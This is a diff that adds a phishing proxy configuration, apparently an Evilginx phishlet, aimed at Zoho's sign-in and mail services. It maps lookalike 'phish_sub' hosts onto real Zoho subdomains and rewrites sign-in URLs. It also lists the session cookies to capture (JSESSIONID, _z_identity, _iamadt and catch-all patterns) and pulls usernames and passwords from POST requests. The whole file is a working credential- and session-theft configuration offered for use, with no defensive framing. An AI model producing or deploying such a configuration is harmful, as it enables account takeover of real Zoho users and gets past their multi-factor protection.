@@ -1,0 +1,114 @@
+name: 'zoho'
+author: '@simonparis007'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'zoho.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'us4-wms2', orig_sub: 'us4-wms2', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'salesiq', orig_sub: 'salesiq', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  # - {phish_sub: 'www', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+
+
+sub_filters:
+  # - {triggers_on: 'js.zohocdn.com', orig_sub: 'js', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/ichat/js/Apr_15_2024_8162636_wmsliteapi.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  # - {triggers_on: 'js.zohocdn.com', orig_sub: 'js', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/ichat/js/46520dce_wmsbridge.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/tp_pkg/xregexp-all.2a67efb28253461665e6cd92f41b19b0.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/tp_pkg/u2f-api.5efcbd46fc391c7d06fabef02b162563.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+ 
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/tp_pkg/jquery-3.6.0.min.8fb8fee4fcc3cc86ff6c724154c49c42.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/js/signinnew.min.2ff7c1202226ebdb0c7bc5813b4f2ab6.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/zohopuvi/zoho_puvi_semibold.ec775134290eac7cb9e8fd31bfc908c5.woff', mimes: ['text/html', 'application/json', 'application/javascript']}
+ 
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/zohopuvi/zoho_puvi_regular.2115e13d08dc114dd29d568b411169d9.woff', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/zohopuvi/zoho_puvi_medium.63ce939dabb7a62611c66c2f03cd7781.woff', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/zohopuvi/zoho_puvi_bold.d9145ee851fb8481a4efdfbdb8ddb278.woff', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/newZoho_logo.5f6895fcb293501287eccaf0007b39a5.svg', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/fonts/signinicon.9cd8b1b51931e368f8d730d7382f529a.woff2', mimes: ['text/html', 'application/json', 'application/javascript']}
+ 
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/fonts/flags.e563dd40805ff37cd0ca1ff2cbc82060.woff2', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/images/bg.49756b7c711696d95133fa95451f8e13.svg', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/css/zohoPuvi.c86bbb480e4a4fbc379fd8e7298bbde5.css', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'static.zohocdn.com', orig_sub: 'static', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/iam/v2/components/css/signinnew.min.633a03cef16c701582c89cc1ab5d9855.css', mimes: ['text/html', 'application/json', 'application/javascript']}
+  
+  # - {triggers_on: 'accounts.zohocdn.com', orig_sub: 'accounts', domain: 'zohocdn.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/s/165199ea3f0d73f2ebc891ed230878ac5408b06d1c09b83f42ac7f097700ad36.js', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+
+
+
+  
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/signin', replace: 'https://{hostname}/signin', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/signin/v2/banner', replace: 'https://{hostname}/signin/v2/banner', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/accounts/public/api/locate', replace: 'https://{hostname}/accounts/public/api/locate', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/signin/v2/lookup/([0-9a-z]*)', replace: 'https://{hostname}/signin/v2/lookup/${1}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/signin/v2/primary/([0-9a-z]*)/password', replace: 'https://{hostname}/signin/v2/primary/${1}/password', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/home', replace: 'https://{hostname}/home', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/accounts-msgs', replace: 'https://{hostname}/accounts-msgs', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/wms/pconnect.sas', replace: 'https://{hostname}/wms/pconnect.sas', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/webclient/v1/template/profile', replace: 'https://{hostname}/webclient/v1/template/profile', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: 'https://{hostname}/webclient/v1/account/self/user/self', replace: 'https://{hostname}/webclient/v1/account/self/user/self', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'mail.zoho.com', orig_sub: 'mail', domain: 'zoho.com', search: 'https://{hostname}/biz/getHamburgerMenu.do', replace: 'https://{hostname}/biz/getHamburgerMenu.do', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'us4-wms2.zoho.com', orig_sub: 'us4-wms2', domain: 'zoho.com', search: 'https://{hostname}/v2/wmsconnector.html', replace: 'https://{hostname}/v2/wmsconnector.html', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'us4-wms2.zoho.com', orig_sub: 'us4-wms2', domain: 'zoho.com', search: 'https://{hostname}/register', replace: 'https://{hostname}/register', mimes: ['text/html', 'application/json', 'application/javascript']}  
+
+  - {triggers_on: 'us4-wms2.zoho.com', orig_sub: 'us4-wms2', domain: 'zoho.com', search: 'https://{hostname}/wmsevent', replace: 'https://{hostname}/wmsevent', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  - {triggers_on: 'accounts.zoho.com', orig_sub: 'accounts', domain: 'zoho.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+
+auth_tokens:
+  - domain: '.zoho.com'
+    keys: ['.*,regexp']
+  - domain: 'accounts.zoho.com'
+    keys: ['zps-tgr-dts', 'zpsfa_sixYsSO', 'zohocares-_zldp', 'zohocares-_uuid', 'IAMSATCK_728151783', 'e188bc05fe', 'iamcsr', '_zcsr_tmp', 'JSESSIONID', 'stk', '_iamadt', '_iambdt', '_z_identity', '.*,regexp']
+  - domain: 'mail.zoho.com'
+    keys: ['.*,regexp']    
+credentials:
+  username:
+    key: 'loginid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'loginid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'identifier'
+      search: '([0-9]*)'
+      type: 'post'
+auth_urls:
+  - '/home'
+login:
+  domain: 'accounts.zoho.com'
+  path: '/signin'
